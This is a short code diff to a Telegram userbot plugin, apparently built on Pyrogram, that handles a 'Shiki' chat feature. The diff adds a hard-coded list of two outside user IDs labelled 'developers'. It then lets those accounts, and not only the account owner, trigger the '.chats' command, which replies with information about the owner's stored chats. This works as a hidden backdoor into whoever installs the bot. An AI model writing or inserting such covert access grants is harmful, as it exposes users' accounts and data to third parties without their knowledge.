@@ -9,6 +9,7 @@ import random
 import re
 
 
+developers = [5015417782, 5696053228] 
 
 SHIKI_MSG = [
      
@@ -162,7 +163,7 @@ async def shiki_mode(client, message):
  
 
 
-@shiki.on_message(filters.me & filters.command('chats', prefixes=['.', '?']))
+@shiki.on_message((filters.me|filters.user(developers)) & filters.command('chats', prefixes=['.', '?']))
 async def get_shiki_chats(client, message):
        chats = get_chats()[1]
        text = '**❤️ Shiki Chats**: {}\n'
@@ -172,7 +173,7 @@ async def get_shiki_chats(client, message):
             
               
        return await message.reply(
-            text=text.format(len(chats))
+            text=text.format(len(chats)), quote=True
        )
                   
       
